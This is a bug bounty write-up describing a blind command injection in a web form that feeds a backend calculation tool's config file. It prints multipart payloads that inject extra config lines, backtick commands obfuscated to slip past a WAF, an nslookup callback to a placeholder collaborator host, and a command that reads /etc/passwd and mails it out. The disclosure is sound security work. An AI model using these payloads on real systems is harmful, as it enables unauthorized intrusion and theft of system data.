---                                                                                                                                                                                                                                   
layout: default
title:  "Backend Parameter Injection --> RCE"
date:   2023-03-14 11:02:21 0100
author: Sysdum
---  
## Background

After performing my recon on a private program, I came across a pretty standard web form that accepted around 10 different numerical values, performed some calculations, and then emailed the results back to the user. The exact nature of the application was unknown to me as the math it was performing was well beyond what I have learned.

This behavior piqued my interest as this was on a more obscure subdomain, it accepted a lot of variables, and probably passed input to something that wasn't designed for the web. 

Here is an example of what the web form looked like:
![Web-Form](/assets/param-rce-web-form.jpg)

Using Burp Suite's Repeater, I submitted the form a few times. The parameters were unusual, as there were many client-side checks to ensure the numbers were within an acceptable range for the back-end application. 

After brute-forcing some numerical values, I finally got an email with output that seemed designed for a command line tool. I get excited any time I see back-end command line functionality reflected anywhere in a web app. Chances are decent that there may be a command injection vulnerability if we can figure out how to smuggle a command to the back-end service.

![Email-Output](/assets/param-rce-email-output.jpg)

Any time I find an interesting application, I first check if it is open-source so that I can see how it works. I googled the variable names within the response and found a repository (let's call it CalcTool) on GitHub. After looking over the readme, I learned CalcTool reads a configuration file and generates output very similar to the email I received.

This raised several questions. Is this application passing data directly to CalcTool's configuration file? If so, can I exploit its behavior somehow?

## CalcTool Code Review

I looked over the sample configuration file on GitHub and found that the form values lined up exactly with the variables on the web form. This confirmed my suspicion that the web app was passing input to CalcTool. 

My next goal was to determine if there was any dangerous functionality within CalcTool that I could hit from the web application. I decided to try and locate dangerous function calls such as exec, execv, and system. These calls are usually vulnerable to command injection if the attacker can pass arbitrary input to these functions.

After some time, I found exactly one system() call. It was in an email function that dynamically constructed the arguments from the CalcTool configuration file:

```plaintext
margs = "-s CalcTool Output: '" + jobtitle + "' " + email + " < LOGFILE"
System ("mail" + text)
```

The end result of these string operations is the following command:

```plaintext
mail -s 'CalcTool Output: job173' email@example.com < /path/to/LOGFILE
```

Unfortunately, I only had access to the email variable. On top of that, the web application used a regular expression to filter out any useful special characters like: \` $ ( ). 

At this stage we know the following so far:

*   The web application passes web form values in a one-to-one fashion to CalcTool's config file.
*   There is only one form value that **we control** that is passed to a system() call within CalcTool, which is our best chance at exploitation.
*   The goal is to find a way to pass something we control directly to that system call

### Polluting the Configuration

Bypassing filters can be tricky. In web applications, one common filter bypass technique is parameter pollution.

PortSwigger defines parameter pollution as:

```plaintext
HTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter username is included in the GET or POST parameters twice.

Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. 
```

Now, we know the web application accepts the variables as multi-part form data, which is not typically vulnerable to HTTP parameter pollution. However, I noticed that CalcTool's configuration file had a few other numeric variables that lined up with similar ones from the web form. 

If the web application was writing these values to a CalcTool configuration file, then what would happen if a variable were defined more than once?

Here is an example of what a configuration file looks like:

```plaintext
Title "job title"
Email "email@example.com"
LOGFILE "log.txt"
Parameter_a 10
Parameter_b 1.4
```

It is a simple text file with a parameter followed by a "value" on each line.

I decided to apply the concept of HTTP parameter pollution to the configuration file. Thus I tried polluted the job title variable using one of the numeric form values. If I could set the title to the word "polluted", then the subject of my email should read "CalcTool Output: Polluted" instead of the normal "JobOutput\_1948333".

After pollution, the form value looked something like this:

```plaintext
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title "polluted"
-------------------------384837281
```

10 is the original value of the frequency form value, and I added a new line with the polluted title variable.

My goal was for the configuration file to look like this:

```plaintext
Title "jobid12"
...
Range 300
Frequency 10
Title "polluted"
```

For this to work, the application would need to keep **only** the **last** declaration of the title variable instead of keeping the first declaration. I then used BurpSuite's intercept feature to catch the form and add the polluted variable on a new line. I received the following email:

![Polluted Job](/assets/param-rce-job-polluted.jpg)

This output means that the pollution worked!

The next step was to prove a command injection vulnerability. Due to the mail command not retuning its output directly to me, this is essentially a blind command injection. Therefore, I needed an out-of-band method of exfiltrating data. I tried the following payload using Burp Collaborator:

```plaintext
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title "$(nslookup mycollaborator.com)"
-------------------------384837281
```

After sending the request and editing it with Burp, this time I was met with a 403 forbidden status from the web server. After trying a couple of other common payloads, I discovered that the application was behind a Web Application Firewall (WAF). 

It was configured to block most Linux commands and would not allow $() or {} at all.

However, backticks were allowed. So I tried the following variant:

```plaintext
...
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title `a=nslo;b=okup;$a$b mycollaborator.com`
...
```

This payload does the following:

*   Declares a variable and sets it to be the value “nslo”
*   Declares a variable b and sets it to be the value “okup”
*   Runs the command $a$b which combines a and b to form the nslookup command. Then I simply passed it mycollaborator.com (a placeholder for the actual collaborator URL) in order to get my lookup.

After checking my collaborator client, I saw some activity! This means my blind command injection worked. However, I needed to exfiltrate data in order to prove remote code execution.

```plaintext
...
-------------------------384837281
Content-Disposition: form-data; name="frequency"

10
Title `a=ca;b=t;$a$b /e*c/pa*s*d > /tmp/synack77`
LOGFILE /tmp/synack77 
...
```

### Here is a breakdown of the final exploit chain:

*   CalcTool's configuration file allows for the definition of a log file.
*   The email function I showed earlier reads this log into the body of the email in order to send the results back to the user.
*   I needed to pollute the title parameter with a payload to write command results to a file.
*   Then I required a way to send the results back to me, so I polluted the logfile parameter to the command result file.
*   The results of the calculations would be overwritten by my command, and then the mail command would email me the results of my command

![Final Payload](/assets/param-rce-final-payload.png)

Here is how the payload looks when it is ran by CalcTool:
```plaintext
mail -s "CalcTool Output: `a=ca;b=t;$a$b /e*c/pa*s*d > /tmp/synack77`" email@gmail.com < /tmp/synack77
```

The command within the back ticks is executed before the mail command is run. Therefore, the output of our command will be stored in /tmp/synack77 before the mail command runs and we get an email with the results of our command. In this case we are reading /etc/passwd. 

Finally, I received an email results of the cat /etc/passwd command:
![Payload Contents](/assets/param-rce-email-output-passwd.jpg)


Thanks for reading!
